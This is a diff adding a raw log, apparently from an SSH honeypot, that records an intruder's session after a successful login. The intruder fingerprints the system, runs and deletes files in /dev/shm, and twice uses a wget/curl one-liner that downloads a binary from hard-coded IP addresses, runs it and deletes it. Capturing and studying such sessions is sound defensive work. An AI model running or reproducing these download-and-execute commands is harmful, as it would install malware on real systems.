@@ -1,0 +1,21 @@
+180315-22:27:50 login login successful 
+180315-22:27:50 channel_request session 
+180315-22:27:50 exec_request success 
+180315-22:27:50 exec command (uname -srmo) 
+180315-22:27:51 channel_request session 
+180315-22:28:59 channel_request session 
+180315-22:28:59 exec_request success 
+180315-22:28:59 exec command (/dev/shm/VaufpZWnIbWWw) && echo EX;sleep 5;rm -rf /dev/shm/VaufpZWnIbWWw 
+180315-22:29:05 channel_request session 
+180315-22:29:05 exec_request success 
+180315-22:29:05 exec command uname -a;cd /dev/shm/ || cd /var/tmp;fn=B00M;wfn=6000.bin;rm -f $fn;for w in http://92.222.83.172/ http://91.134.134.116/ ;do (wget -q -O $fn $w$wfn || curl -o $fn $w$wfn) && break;done;chmod +x $fn;./$fn;sleep 3;rm -f $fn 
+180315-22:29:53 channel_request session 
+180315-22:30:53 channel_request session 
+180315-22:30:54 exec_request success 
+180315-22:30:54 exec command (/dev/shm/vpApNXBUnr) && echo EX;sleep 5;rm -rf /dev/shm/vpApNXBUnr 
+180315-22:30:59 channel_request session 
+180315-22:31:00 exec_request success 
+180315-22:31:00 exec command uname -a;cd /dev/shm/ || cd /var/tmp;fn=B00M;wfn=1521.bin;rm -f $fn;for w in http://92.222.83.172/ http://91.134.134.116/ ;do (wget -q -O $fn $w$wfn || curl -o $fn $w$wfn) && break;done;chmod +x $fn;./$fn;sleep 3;rm -f $fn 
+180315-22:36:01 channel_request session 
+180315-22:36:01 exec_request success 
+180315-22:36:01 exec command for c in ls cat find;do ($c /var/run/sftp.pid || $c /var/run/mount.pid || $c /var/run/gcc.pid) > /dev/null && echo TITAN && break;done 
